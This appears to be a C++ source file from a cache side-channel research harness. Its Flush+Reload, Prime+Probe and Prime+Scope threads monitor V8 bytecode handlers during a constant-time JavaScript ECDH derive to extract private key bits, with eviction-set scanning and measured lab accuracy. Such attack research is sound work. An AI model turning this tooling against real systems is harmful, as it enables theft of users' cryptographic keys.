#include <pthread.h>
#include <sched.h>
#include <unistd.h>

#include <atomic>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>

#include "v8_runtime.h"

extern "C" {
#include "arch.h"
#include "cache.h"
#include "config.h"
#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "prime_probe.h"
#include "shared_memory.h"
}

enum { cache_line_count = 2, profile_iterations = 1 << 16 };

static const uint64_t max_exec_cycles = (uint64_t)5e10;

/* PP_profile_once/PS_profile_once (src/attack/prime_probe.c) have no
 * sync_ctx-based early exit -- unlike this file's hand-rolled F+R/P+S
 * loops, they always poll for the full max_exec_cycles unless
 * profile_iterations fills first. max_exec_cycles above (5e10, a ~17s
 * safety cap) is sized for THOSE loops' early-exit case; used here it would
 * make every PP round -- or every identify_ctjs_target_sets/
 * pp_evset_quality_ok candidate -- take ~17s regardless of how long the
 * real derive took. One ECDH derive is ~9.6M cycles (see
 * project_v8_ecdh_ct_fr); this gives comfortable margin over that, same
 * shape as quickjs_rsa_key_pool.c's own 3e9 (~1s) cap for one RSA sign. */
static const uint64_t pp_max_exec_cycles = (uint64_t)1e8;

static int victim_runs = 20;

static const char *test_name = "v8_ctjs_ecdh";

/* Set from argv in main, read by v8_victim_thread: the victim now runs on its
 * own pthread, so the paths can no longer be locals of main. Written before
 * pthread_create and never afterwards, which is the ordering that makes them
 * safe to read unsynchronized from the victim. */
static const char *source_str = nullptr;
static const char *repeat_str = nullptr;
static const char *key_path = nullptr;

static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t reload_time_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *reload_time[cache_line_count];
static uint64_t **const probe_time = reload_time;

enum { H_NEGATE = 0, H_BITAND, H_BITXOR, handler_count };

struct handler_info {
	const char *name; /* exact V8 builtin name, as reported by the JIT event */
	uintptr_t addr;
	size_t len;
};

static handler_info handlers[handler_count] = {
	{ "NegateHandler", 0, 0 },
	{ "BitwiseAndHandler", 0, 0 },
	{ "BitwiseXorHandler", 0, 0 },
};

struct target_builtin_line {
	int handler; /* index into handlers[] */
	uint64_t off; /* byte offset of the 64 B line within that builtin */
	char role; /* '0' fires only for a 0-bit, 'c' once per BN.select */
};

/* Overridable with -cl<i>=<handler>:<off>:<role>, which is how a moved leak
 * site is found again: change the mask expression in js/ecdh_ct_eval.js and the
 * slow path moves to a different line of the same handler. */
static target_builtin_line target_lines[cache_line_count] = {
	{ H_BITAND, 0x080, '0' }, /* marker: HeapNumber(-0) slow path, 0-bit only */
	{ H_NEGATE, 0x000, 'c' }, /* clock:  exactly once per BN.select */
};

/* "and:0x0c0:0" -> target_lines[cl]. The handler is matched by any unique
 * case-insensitive substring of its V8 name MINUS the "Handler" suffix, so
 * "neg"/"and"/"xor" all work -- matching the full name instead makes every
 * handler match "and", which is a substring of "Handler". */
static bool parse_target_line(int cl, const char *spec) {
	if (cl < 0 || cl >= cache_line_count) {
		log_error("-cl%d: only %d channels exist", cl, cache_line_count);
		return false;
	}
	char buf[128];
	snprintf(buf, sizeof(buf), "%s", spec);

	char *off_tok = strchr(buf, ':');
	if (!off_tok) {
		log_error("-cl%d=%s: expected <handler>:<off>[:<role>]", cl, spec);
		return false;
	}
	*off_tok++ = '\0';
	char *role_tok = strchr(off_tok, ':');
	if (role_tok) {
		*role_tok++ = '\0';
	}

	int found = -1;
	for (int h = 0; h < handler_count; ++h) {
		char base[64];
		snprintf(base, sizeof(base), "%s", handlers[h].name);
		char *suffix = strstr(base, "Handler");
		if (suffix) {
			*suffix = '\0';
		}
		if (strcasestr(base, buf)) {
			if (found >= 0) {
				log_error(
				    "-cl%d=%s: '%s' matches several handlers", cl, spec, buf);
				return false;
			}
			found = h;
		}
	}
	if (found < 0) {
		log_error("-cl%d=%s: no handler matching '%s'", cl, spec, buf);
		return false;
	}

	char *end = nullptr;
	uint64_t off = strtoull(off_tok, &end, 0);
	if (end == off_tok || *end != '\0') {
		log_error("-cl%d=%s: bad offset '%s'", cl, spec, off_tok);
		return false;
	}

	char role = target_lines[cl].role;
	if (role_tok) {
		if (strlen(role_tok) != 1 || !strchr("01c", role_tok[0])) {
			log_error("-cl%d=%s: role must be one of 0, 1, c", cl, spec);
			return false;
		}
		role = role_tok[0];
	}

	target_lines[cl].handler = found;
	target_lines[cl].off = off;
	target_lines[cl].role = role;
	return true;
}

static FR_attacker_thread_config_t fr_lines[cache_line_count];

static EVSet *ps_evsets[cache_line_count];
static evchain *ps_chains[cache_line_count];

static uint64_t fr_wait_cycles = 2000;

static i64 fr_hit_thresh = 260;

/* Which primitive polls the target lines. P+S and P+P share the eviction-set
 * machinery and the per-cache-line thread layout; they differ only in what one
 * poll does -- P+S times ONE scope line and must re-prime the whole set after
 * every detection, P+P times a traversal of the set, which measures and
 * restores in the same pass. */
enum prim_t { PRIM_PS = 0, PRIM_FR, PRIM_PP };
static prim_t prim = PRIM_PS;
static const char *prim_name(void) {
	return prim == PRIM_FR ? "fr" : prim == PRIM_PP ? "pp" : "ps";
}
static bool ps_fast_reprime = false;
static uint32_t ps_arr_repeat = 3;
static uint32_t ps_l2_repeat = 1;

/* Unprofiled derive() calls before profiling, so every non-select function
 * (curve field arithmetic, point bookkeeping) tiers up to TurboFan and stops
 * executing the bytecode handlers -- BN.select is pinned to the interpreter
 * from module load (see ecdh_ct_eval.js), so after warmup it is the ONLY code
 * touching them. */
static int warmup_runs = 5;

static bool name_is(const v8::JitCodeEvent *event, const char *base) {
	const char *s = event->name.str;
	size_t len = event->name.len;
	for (size_t i = 0; i < len; ++i) {
		if (s[i] == ':') {
			s += i + 1;
			len -= i + 1;
			break;
		}
	}
	size_t blen = strlen(base);
	return len == blen && memcmp(s, base, blen) == 0;
}

static void jit_event_handler(const v8::JitCodeEvent *event) {
	if (event->type != v8::JitCodeEvent::CODE_ADDED) {
		return;
	}
	if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
		return;
	}
	for (int h = 0; h < handler_count; ++h) {
		if (name_is(event, handlers[h].name)) {
			handlers[h].addr = reinterpret_cast<uintptr_t>(event->code_start);
			handlers[h].len = event->code_len;
			return;
		}
	}
}

static void init_target_lines(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		const target_builtin_line &b = target_lines[cl];
		FR_thread_config_init(fr_lines[cl]);
		fr_lines[cl].label = handlers[b.handler].name;
		fr_lines[cl].slot = cl;
		fr_lines[cl].target = (uint8_t *)(handlers[b.handler].addr + b.off);
	}
}

static void log_channels(const char *prim) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		log_info("cl%d role '%c'  %s +0x%03lx  (%s, %p)",
		         cl,
		         target_lines[cl].role,
		         fr_lines[cl].label,
		         target_lines[cl].off,
		         prim,
		         (void *)fr_lines[cl].target);
	}
}

static void write_channel_metadata(void) {
	char dir[256], path[512];
	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
	create_directory(dir);
	snprintf(path, sizeof(path), "%s/channels", dir);

	FILE *fp = fopen(path, "w");
	if (!fp) {
		log_error("could not write channel metadata to %s", path);
		return;
	}
	fprintf(fp, "# col role handler off primitive\n");
	for (int cl = 0; cl < cache_line_count; ++cl) {
		fprintf(fp,
		        "%d %c %s 0x%lx %s\n",
		        cl,
		        target_lines[cl].role,
		        fr_lines[cl].label,
		        target_lines[cl].off,
		        prim_name());
	}
	fclose(fp);
	log_info("channel metadata -> %s", path);
}

static const char *format_counts(char *buf, size_t n, const uint32_t *idx) {
	size_t at = 0;
	for (int cl = 0; cl < cache_line_count && at < n; ++cl) {
		int w =
		    snprintf(buf + at, n - at, "%scl%d %u", cl ? " " : "", cl, idx[cl]);
		if (w < 0) {
			break;
		}
		at += (size_t)w < n - at ? (size_t)w : n - at;
	}
	return buf;
}

/* ---------------------------------------------------------------------------
 * CACHE SET IDENTIFICATION -- PP only. Rather than trust
 * prepare_evset(target_addr)'s address-based construction blindly, scan
 * every SF set near the target's page slot (get_sf_kth_evset, blind to the
 * address otherwise -- like v8_ecdh_key_pool.cc's cross-process CSI, but
 * same-process and address-assisted since BN.select's targets are already
 * known exactly, resolved through the JIT event API, see
 * jit_event_handler) and pick the one that behaves like the channel it is
 * supposed to be. TWO STAGES, because neither alone is enough.
 *
 * Stage 1, SHAPE. On a channel genuinely watching the ladder, the gap
 * between consecutive detections is strictly BIMODAL:
 *
 *   ~2.6-4.3k cyc   inside one ladder step -- the four BN.select calls
 *   ~36-42k cyc     between steps -- the field arithmetic, which TurboFan
 *                   compiled and which therefore touches no bytecode handler
 *
 * -- the same percentile gap-ratio shape EVSET HEALTH below already
 * validates for a KNOWN-good evset (p90/p15 spread 14.5-17.0), plus bounds
 * on the hit count and on those two bands: see csi_shape_ok. Not
 * check_cache_set_psd's FFT/base-frequency version (see src/utils/dsp.c) --
 * that needs a real capture to calibrate a base frequency against, which
 * isn't available here. Measured on leapx02 this cuts ~480 candidates per
 * page slot to under a dozen, and the true set is always among them.
 *
 * Stage 2, KEY CYCLING, is what actually names the marker -- and stage 1
 * CANNOT. The ladder is constant-time, so every set it touches ticks at the
 * step period and all the stage-1 survivors look alike; scanning under the
 * real key alone (which is what this used to do) accepted whichever
 * ladder-active set came first, and measurement with -csi-oracle showed that
 * set was not the target. What separates them is the SEMANTICS of the line,
 * and the marker's are key-dependent by construction: BitwiseAndHandler
 * +0x080 is the HeapNumber(-0) slow path, reached only on a 0-bit step. So
 * drive the victim through known scalars (csi_probe_keys) and count -- the
 * marker is silent on the all-one scalar and loud on the all-zero one, while
 * the clock is flat across both. See csi_marker_matches/csi_clock_matches.
 *
 * -csi runs this scan in v8_ctjs_ecdh_attack's setup, before any attacker
 * thread exists -- not a round-loop probe segment, see identify_ctjs_
 * target_sets and pp_setup_more below. Not available with -fr/-ps: F+R has
 * no eviction set at all, and P+S's evset is built per-thread rather than
 * in setup (see v8_attacker_thread).
 *
 * Validated end to end on leapx02 (2026-08-17, key 0, 100 P+P runs each,
 * decoded with evaluation/extract_v8_ctjs_ecdh.py): prepare_evset_thres's
 * address-built evsets give known-accuracy 0.822 (38 wrong bits), the sets
 * this scan finds give 0.879 (24 wrong). -csi-oracle confirmed the marker it
 * picks is the set that really holds the target line, on two different
 * scalars. */
static bool csi_arg = false;

/* -csi-dump: scan every candidate instead of stopping at the first match, log
 * one line per candidate and write its trace to
 * output/v8_ctjs_ecdh_csi_{clock,marker}/r<l3_set>.out. This is how the accept
 * bounds below were measured, and how a scan that finds nothing is diagnosed:
 * without the dumps there is no way to tell "no candidate carries the signal"
 * from "the signal is there and the check is wrong".
 *
 * -csi-oracle: additionally label each candidate with whether it really does
 * evict the target line (precise_evset_test_alt). That uses the address CSI
 * is not allowed to know, so it never gates acceptance -- it is the
 * evaluation-only ground truth that turns the fingerprint's hit rate into a
 * measurement. */
static bool csi_dump_arg = false;
static bool csi_oracle_arg = false;

enum {
	/* Between the ~2.6-4.3k in-step gap and the ~36-42k inter-step gap,
	 * comfortably clear of both. */
	csi_gap_split = 10000,

	/* A candidate with fewer detections than this over a whole derive cannot
	 * be the clock (~2 per step x 246 steps) or the marker (one per 0-bit
	 * step); below it there is nothing to fingerprint. */
	csi_min_samples = 128,

	csi_probe_count = 3,
	csi_max_finalists = 64,

	/* build_l2_evsets_all is a probabilistic search that fails outright about
	 * half the time on an idle leapx02; see identify_ctjs_target_sets. */
	csi_evset_build_retries = 8,
};

/* Stage 1 -- SHAPE. A RECALL filter, deliberately: its only job is to get the
 * candidate count down to something stage 2 can afford to key-cycle without
 * ever dropping the true set. Stage 2 is what decides.
 *
 * Two gap populations identify a channel watching the ladder -- the in-step
 * BN.select spacing and the inter-step period named in the CACHE SET
 * IDENTIFICATION comment -- so require a low percentile in the first band and
 * an upper percentile at least reaching the second.
 *
 * NOT a band on gap_p50, which is what this first used. Where the median
 * falls depends on the DETECTION RATE, not on the channel: at ~2 hits per
 * step the median is the step period, at ~4 it is an in-step gap. That is a
 * per-session property -- the same marker line measured 290-520 hits per
 * derive one afternoon and 944-949 a few hours later -- and a gap_p50 band
 * fitted to the first of those silently rejected the true marker in the
 * second, which is a scan that finds nothing and cannot be retried into
 * working. gap_p15 and gap_p90 are stable across both.
 *
 * Checked against the 957-candidate -csi-dump sweep (leapx02 2026-08-17):
 * keeps 20 of 480 clock and 20 of 477 marker candidates, including both true
 * ones. The old gap_p50 form kept 8 and 10 -- tighter, and fragile. */
static int csi_min_hits = 150, csi_max_hits = 2500;
static uint64_t csi_step_gap_lo = 20000;
static uint64_t csi_instep_gap_lo = 1500, csi_instep_gap_hi = 8000;

/* Stage 2 -- KEY CYCLING, which is what actually names the marker line.
 *
 * Shape cannot: the ladder is constant-time, so every set the ladder touches
 * ticks at the step period and all 8-10 stage-1 survivors look alike. What
 * separates them is the SEMANTICS of the line, and the marker's semantics are
 * key-dependent by construction -- BitwiseAndHandler +0x080 is the
 * HeapNumber(-0) slow path, reached only on a 0-bit step. So drive the victim
 * through known scalars and count:
 *
 *   ones  (ff..ff)  no 0-bits    -> the marker line is never executed
 *   zeros (10..00)  all 0-bits   -> it is executed every step
 *   alt   (fe..fe)  one 0 in 8   -> in between
 *
 * The clock (NegateHandler +0x000, once per BN.select) is FLAT across all
 * three, which is a weaker statement -- so is every other constant-time part
 * of the ladder -- so flatness only qualifies a clock candidate; the tie is
 * broken on shape (see csi_clock_score). That asymmetry is fine: a wrong
 * clock costs segmentation quality, which the decode measures, while a wrong
 * marker would silently decode the wrong bits. */
static const char *csi_probe_keys[csi_probe_count] = {
	"experiments/v8_constant_time_js/ec_key_ones.hex",
	"experiments/v8_constant_time_js/ec_key_zeros.hex",
	"experiments/v8_constant_time_js/ec_key_alt.hex",
};
enum { csi_key_ones = 0, csi_key_zeros = 1, csi_key_alt = 2 };

/* The marker test is a CONTRAST plus a MONOTONICITY test, not a ratio of
 * counts. A ratio ("ones must be under 30% of zeros") assumes the silent key
 * really reads near zero, and that only holds when the channel has no noise
 * floor. The same true marker line measured ones=7 zeros=426 one afternoon
 * and ones=471 zeros=937 the same night -- the signal was identical, ~460
 * detections of key-dependent activity, sitting on top of a floor that had
 * grown from ~7 to ~471. The ratio test passed the first and failed the
 * second; the difference passes both.
 *
 * Contrast alone is not enough either -- a noisy candidate scored a LARGER
 * difference (+660) than the true marker (+466) in that same scan. What that
 * candidate could not do is respond monotonically: with one 0-bit in eight,
 * the alt scalar has to land between the all-one and all-zero counts, and its
 * alt reading was below BOTH. */
static const double csi_marker_contrast = 0.25; /* (zeros-ones)/zeros */
static const double csi_marker_mono_tol = 0.10; /* slack on ones<=alt<=zeros */
static const double csi_flat_ratio = 0.60; /* clock: min/max across keys */
/* Clock ticks, as a multiple of the marker's contrast -- see
 * csi_clock_matches for what each bound catches. */
static const double csi_clock_scale_lo = 0.50;
static const double csi_clock_scale_hi = 2.00;

/* -csi-runs=<n>: dedicated probe runs for -psd-check's segment (P+S only,
 * see below) -- shared knob, formerly also used to size -csi's since-removed
 * round-loop segments. */
static int csi_runs = 40;
enum { csi_runs_max = 64 };

static int cmp_u64(const void *a, const void *b) {
	uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
	return x < y ? -1 : x > y ? 1 : 0;
}

static uint64_t u64_median(uint64_t *v, size_t n) {
	if (n == 0) {
		return 0;
	}
	qsort(v, n, sizeof(v[0]), cmp_u64);
	return v[n / 2];
}

static int cmp_double(const void *a, const void *b) {
	double x = *(const double *)a, y = *(const double *)b;
	return x < y ? -1 : x > y ? 1 : 0;
}

static double double_median(double *v, size_t n) {
	if (n == 0) {
		return 0;
	}
	qsort(v, n, sizeof(v[0]), cmp_double);
	return v[n / 2];
}

/* ---------------------------------------------------------------------------
 * EVSET HEALTH -- is this evset clean, or self-evicting/smearing noise into
 * the trace?
 *
 * This is a different failure mode from CACHE SET IDENTIFICATION above: a
 * channel can be watching exactly the right handler and still be unusable
 * because its evset itself is marginal, which shows up as extra spurious
 * detections rather than a wrong semantic role -- identify_ctjs_target_sets'
 * own gap-shape candidate check (check_candidate_gap_spread) catches this
 * for -csi's scanned candidates; this is the same idea, applied to the
 * SAME channel's accumulated history instead of a single candidate trace,
 * for -pp/-ps's regular (non-scanned) evsets. Two cheap per-run statistics
 * do catch it, following the same hit-count-plus-distribution-shape
 * approach as
 * quickjs_rsa_key_pool.c's check_goto8_distribution: no FFT needed here (see
 * check_cache_set_psd in src/utils/dsp.c for that heavier version).
 *
 *   hit rate    = raw detections on the channel / gap_measure's own step
 *                 count. A clean channel detects close to once per step (the
 *                 clock at ~2 detections/step here); self-eviction adds
 *                 extra probes that don't correspond to a step, so a noisy
 *                 evset's rate is several times higher.
 *   gap spread  = p90 gap / p15 gap. A clean trace's gaps cluster tightly
 *                 into the two BIMODAL bands from the header comment above,
 *                 so this ratio is large; a self-evicting evset smears
 *                 detections into the dead band between them and collapses
 *                 the spread toward 1.
 *
 * Measured 2026-08-12, 100 P+P runs each, clock channel: output/pp_k0_r00100
 * (known-good evset) gives hit rate 1.78-2.17 and gap spread 14.5-17.0;
 * output/test/pp_k0_r00100 (known-bad, self-evicting evset, same key) gives
 * hit rate 9.2-13.5 and gap spread 3.6-4.1. Both statistics separate with a
 * wide, non-overlapping margin, so the thresholds below have plenty of room
 * on either side.
 *
 * This is a regular-attack concern -- P+P (mandatory) and P+S (opt-in) both
 * build a real eviction set and can build a bad one -- NOT a CSI concern, so
 * it gets its own flag/segment/counter (-psd-check, psd_probe_total,
 * psd_record) rather than riding CSI's. It does not apply to F+R, which has
 * no eviction set to begin with. */
static const double evhealth_hit_rate_ceiling = 4.0;
static const double evhealth_gap_spread_floor = 8.0;

static double evhealth_hit_rate[cache_line_count][csi_runs_max];
static double evhealth_gap_spread[cache_line_count][csi_runs_max];
static uint64_t evhealth_gaps[cache_line_count][profile_iterations];

/* Unconditional for -pp: an evset that came out bad does not announce itself
 * (see above), so a P+P capture always pays for the probe segment and aborts
 * on a bad verdict -- no opt-out flag, this is not optional. -ps stays
 * opt-in via -psd-check. Not available with -fr -- see above. */
static bool psd_check_arg = false;

/* PS ONLY: -pp's psd-check is entirely setup-phase now (pp_evset_quality_ok,
 * driven through pp_setup_more, see v8_ctjs_ecdh_attack/v8_victim_run) and
 * contributes nothing to this round-loop count. psd_check_arg is still
 * unconditionally true for -pp (see above) -- gating on prim here, not on
 * the flag, is what keeps v8_victim_run's cp in sync with what
 * v8_attacker_thread_pp (no round-loop probe segment at all any more)
 * actually does. Measured 2026-08-12: leaving this ungated hung the victim
 * forever on round victim_runs+1, which v8_attacker_thread_pp's plain
 * capture loop never sends -- the attacker side had already returned and
 * joined by the time it was caught. */
static int psd_probe_total(void) {
	return (psd_check_arg && prim == PRIM_PS) ? csi_runs : 0;
}

/* Reads sample_tsc[cl][0..n) -- so it must run before the lead clears the
 * buffers, i.e. before the first attacker barrier of the run. One pass forms
 * the gap-collapsed step count and the two evset-health statistics above;
 * psd_record (P+S's round-loop -psd-check) is the only caller left -- PP's
 * moved to identify_ctjs_target_sets/pp_evset_quality_ok's own
 * check_candidate_gap_spread, which duplicates the gap-spread half of this
 * math directly rather than sharing it, since those run on a raw scan
 * trace, not a channel's own accumulated per-run history. */
static void gap_measure(int cl,
                        uint32_t n,
                        uint32_t *out_steps,
                        double *out_hit_rate,
                        double *out_gap_spread) {
	*out_steps = 0;
	*out_hit_rate = 0;
	*out_gap_spread = 0;
	if (n < 3) {
		return;
	}

	uint64_t *g = evhealth_gaps[cl];
	uint32_t ng = 0, steps = 0;
	for (uint32_t i = 1; i < n; ++i) {
		uint64_t d = sample_tsc[cl][i] - sample_tsc[cl][i - 1];
		g[ng++] = d;
		if (d > csi_gap_split) {
			++steps;
		}
	}
	*out_steps = steps;
	*out_hit_rate = steps > 0 ? (double)n / steps : 0;

	qsort(g, ng, sizeof(g[0]), cmp_u64);
	uint64_t p15 = g[(size_t)((ng - 1) * 0.15)];
	uint64_t p90 = g[(size_t)((ng - 1) * 0.90)];
	*out_gap_spread = p15 > 0 ? (double)p90 / p15 : 0;
}

/* Called only for r < psd_probe_total() -- -psd-check's own segment, on
 * whatever key is actually loaded (the real -key, unlike CSI's known ones).
 * r0 is segment-relative. */
static void psd_record(int cl, int r0, uint32_t n) {
	uint32_t steps;
	double hit_rate, gap_spread;
	gap_measure(cl, n, &steps, &hit_rate, &gap_spread);
	(void)steps;
	evhealth_hit_rate[cl][r0 % csi_runs] = hit_rate;
	evhealth_gap_spread[cl][r0 % csi_runs] = gap_spread;
}

/* Judges the MEDIAN of the probe's runs, not any single one: one run in an
 * otherwise healthy evset can still be eaten by a scheduler hole. */
static bool evhealth_verify(int cl) {
	double hr[csi_runs_max], sp[csi_runs_max];
	for (int r = 0; r < csi_runs; ++r) {
		hr[r] = evhealth_hit_rate[cl][r];
		sp[r] = evhealth_gap_spread[cl][r];
	}
	double hit_rate = double_median(hr, (size_t)csi_runs);
	double gap_spread = double_median(sp, (size_t)csi_runs);
	bool ok = hit_rate <= evhealth_hit_rate_ceiling &&
	          gap_spread >= evhealth_gap_spread_floor;

	if (ok) {
		log_info("psd-check cl%d: hit_rate %.2f (<= %.1f), gap_spread %.2f "
		         "(>= %.1f) OK",
		         cl,
		         hit_rate,
		         evhealth_hit_rate_ceiling,
		         gap_spread,
		         evhealth_gap_spread_floor);
	} else {
		log_error("psd-check cl%d: hit_rate %.2f (want <= %.1f), gap_spread "
		          "%.2f (want >= %.1f) FAIL -- evset looks self-evicting",
		          cl,
		          hit_rate,
		          evhealth_hit_rate_ceiling,
		          gap_spread,
		          evhealth_gap_spread_floor);
	}
	return ok;
}

/* -ps only: the single point v8_attacker_thread calls once its
 * -psd-check probe segment (psd_probe_total() runs) completes. PP's
 * mandatory quality gate moved to setup -- see pp_evset_quality_ok and
 * identify_ctjs_target_sets, not the attack threads. */
static bool probe_verdict(void) {
	bool ok = true;
	for (int cl = 0; cl < cache_line_count; ++cl) {
		ok = evhealth_verify(cl) && ok;
	}
	return ok;
}

/* Percentile gap-ratio shape check (p90/p15 spread, same math as
 * gap_measure/EVSET HEALTH above), applied to a raw candidate trace from
 * identify_ctjs_target_sets or pp_evset_quality_ok rather than a channel's
 * own accumulated gap_measure history -- a self-evicting or wrong-set
 * candidate smears its gaps into the dead band exactly like a bad real
 * evset does. Reuses evhealth_gaps[0] as scratch: safe because this only
 * ever runs during PP setup, before any attacker thread touches it. */
struct csi_stats {
	uint64_t span; /* last detection - first detection */
	uint64_t gap_p15, gap_p50, gap_p90;
	double gap_spread; /* p90/p15 */
};

static void csi_measure(uint64_t *probes, int length, csi_stats *out) {
	*out = csi_stats{ 0, 0, 0, 0, 0.0 };
	if (length < 3) {
		return;
	}
	out->span = probes[length - 1] - probes[0];

	uint64_t *g = evhealth_gaps[0];
	int n = length - 1;
	for (int i = 1; i < length; ++i) {
		g[i - 1] = probes[i] - probes[i - 1];
	}
	qsort(g, (size_t)n, sizeof(g[0]), cmp_u64);
	out->gap_p15 = g[(size_t)(n * 0.15)];
	out->gap_p50 = g[(size_t)(n * 0.50)];
	out->gap_p90 = g[(size_t)(n * 0.90)];
	out->gap_spread =
	    out->gap_p15 > 0 ? (double)out->gap_p90 / out->gap_p15 : 0.0;
}

static bool check_candidate_gap_spread(uint64_t *probes, int length) {
	csi_stats st;
	csi_measure(probes, length, &st);
	return st.gap_spread >= evhealth_gap_spread_floor;
}

/* Thin, distinctly-named wrappers matching quickjs_rsa_key_pool.c's
 * identify_quickjs_target_sets shape (check_goto8_distribution/
 * check_sar_distribution) -- both currently apply the SAME gap-spread test
 * (see above); kept separate because the clock and marker channels are not
 * expected to stay identically calibrated (marker's sample count is far
 * lower -- BitwiseAndHandler+0x80 only widens on a subset of steps, Negate
 * fires every step). */
static bool check_loop_distribution(uint64_t *probes, int length) {
	return check_candidate_gap_spread(probes, length);
}
static bool check_zero_distribution(uint64_t *probes, int length) {
	return check_candidate_gap_spread(probes, length);
}

/* Same-process handshake for PP's setup-phase profiling (identify_ctjs_
 * target_sets' scan, pp_evset_quality_ok's single-shot check) -- driven
 * from v8_ctjs_ecdh_attack on the MAIN thread, before any attacker thread
 * exists, so there is no per-channel lockstep to reuse. PS_profile_once
 * (slot 0) sets SYNC_CTX_START and does barrier A itself; the victim's
 * setup pre-loop (see v8_victim_run) calls repeat_func, sets PAUSE, does
 * barrier B, then checks this flag to decide whether to loop again. A
 * plain same-process atomic, not part of the cross-process sync_ctx
 * protocol -- adding a new SYNC_CTX_* action would ripple into every other
 * experiment that switches on it. */
static std::atomic<bool> pp_setup_more{ false };

/* Scalar the victim should load before the NEXT setup round, or null. The
 * victim owns the isolate, so only it may call v8_set_key; it picks this up
 * after barrier B -- between two profiling windows -- so elliptic's key
 * parsing can never land inside a measured one. Publishing it therefore costs
 * one unprofiled derive, which csi_set_probe_key drives. */
static std::atomic<const char *> pp_setup_key{ nullptr };

/* Call immediately before EVERY PS_profile_once during PP setup. */
static void pp_setup_arm(void) {
	pp_setup_more.store(true, std::memory_order_release);
}

/* Call exactly once, after ALL of PP's setup work (scan, then quality
 * check) is done, to release the victim's setup pre-loop -- one harmless
 * throwaway derive, matching PS_profile_once's own barrier convention
 * (attacker side sets START, victim sets PAUSE). */
static void pp_setup_done(void) {
	pp_setup_more.store(false, std::memory_order_release);
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_barrier_wait(sync_ctx.barrier); /* B */
}

/* ---------------------------------------------------------------------------
 * LIVE HIT-COUNT MONITOR -- catches an evset going bad MID-capture.
 *
 * evhealth_verify (above) only samples csi_runs probe runs before capture
 * starts, and only runs at all under -psd-check (always on for -pp, opt-in
 * for -ps). This is the
 * complement: an absolute ceiling on the clock channel's raw per-run hit
 * count, checked on EVERY captured run, always on -- a single integer
 * compare, cheap enough that there is no reason to gate it behind a flag.
 * It cannot tell WHY a run is noisy (self-eviction, a scheduler hole, a
 * neighbor's cache attack -- this box is shared, see
 * project_leapx02_shared_load), only THAT it was, which is enough to flag it
 * for the operator without aborting hours of otherwise-good capture over one
 * run.
 *
 * Same 2026-08-12 measurement as EVSET HEALTH: clock channel raw hits/run
 * top out at 568 over 100 known-good runs and bottom out at 2316 over 100
 * known-bad ones -- wide margin either side of 1000. */
static const uint32_t clock_hit_ceiling = 1000;
static uint32_t clock_hit_violations = 0;

static int find_clock_cl(void) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		if (target_lines[cl].role == 'c') {
			return cl;
		}
	}
	return -1;
}

static void check_clock_hits(uint32_t n, int run_num) {
	if (n > clock_hit_ceiling) {
		++clock_hit_violations;
		log_error("run %d: clock channel hit count %u exceeds %u -- evset "
		          "may have gone bad for this run",
		          run_num,
		          n,
		          clock_hit_ceiling);
	}
}

static void report_clock_hit_violations(void) {
	if (clock_hit_violations > 0) {
		log_error("%u/%d captured run(s) exceeded the clock hit ceiling -- "
		          "check those traces before trusting the decode",
		          clock_hit_violations,
		          victim_runs);
	}
}

static bool has_suffix(const char *s, const char *suffix) {
	size_t sl = strlen(s);
	size_t fl = strlen(suffix);
	return sl >= fl && strcmp(s + sl - fl, suffix) == 0;
}

static const char *js_quote(const char *s, char *buf, size_t n) {
	size_t at = 0;
	buf[at++] = '\'';
	for (; *s && at + 3 < n; ++s) {
		if (*s == '\'' || *s == '\\') {
			buf[at++] = '\\';
		}
		buf[at++] = *s;
	}
	buf[at++] = '\'';
	buf[at] = '\0';
	return buf;
}

static void clear_samples(const uint32_t *idx) {
	for (int cl = 0; cl < cache_line_count; ++cl) {
		size_t n = idx[cl] < profile_iterations ? idx[cl] : profile_iterations;
		memset(
		    sample_tsc[cl], 0, profile_iterations * sizeof(sample_tsc[cl][0]));
		memset(reload_time[cl],
		       0,
		       profile_iterations * sizeof(reload_time[cl][0]));
	}
}

/* FLUSH+RELOAD has no eviction set -- it flushes and times fr_lines[cl].target
 * directly -- so neither CSI (role-vs-known-key check) nor -psd-check
 * (evset self-eviction check) applies here: there is no evset for either to
 * evaluate. Plain capture loop, no probe phase; -csi/-psd-check are rejected
 * for -fr at argument parsing. */
static void *v8_attacker_thread_fr(void *arg) {
	(void)arg;
	log_channels("FR");
	i64 threshold = fr_hit_thresh;
	const int clock_cl = find_clock_cl();

	for (int r = 0; r < victim_runs; ++r) {
		uint32_t idx[cache_line_count] = { 0 };
		for (int cl = 0; cl < cache_line_count; ++cl) {
			clflush((volatile void *)fr_lines[cl].target);
		}

		pthread_barrier_wait(sync_ctx.barrier); /* A: release victim call */
		u64 t0 = rdtscp(), t1 = t0;
		bool full = false;
		do {
			FR_wait(fr_wait_cycles);
			for (int cl = 0; cl < cache_line_count; ++cl) {
				u64 access_time = timed_access((void *)fr_lines[cl].target);
				if ((i64)access_time <= threshold &&
				    idx[cl] < profile_iterations) {
					sample_tsc[cl][idx[cl]] = rdtscp();
					reload_time[cl][idx[cl]] = access_time;
					++idx[cl];
					if (idx[cl] == profile_iterations) {
						full = true;
					}
				}
				clflush((volatile void *)fr_lines[cl].target);
			}
			t1 = rdtscp();
		} while (!full && sync_ctx_get_action() == SYNC_CTX_START &&
		         (t1 - t0) < max_exec_cycles);

		pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */

		char counts[256];
		log_info("run %d/%d: window %lu cyc, hits %s",
		         r + 1,
		         victim_runs,
		         t1 - t0,
		         format_counts(counts, sizeof(counts), idx));
		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      probe_time,
		                      cache_line_count,
		                      profile_iterations,
		                      r == 0);
		check_clock_hits(idx[clock_cl], r + 1);
		clear_samples(idx);
	}
	report_clock_hit_violations();
	return nullptr;
}

static pthread_barrier_t attacker_threads_barrier;
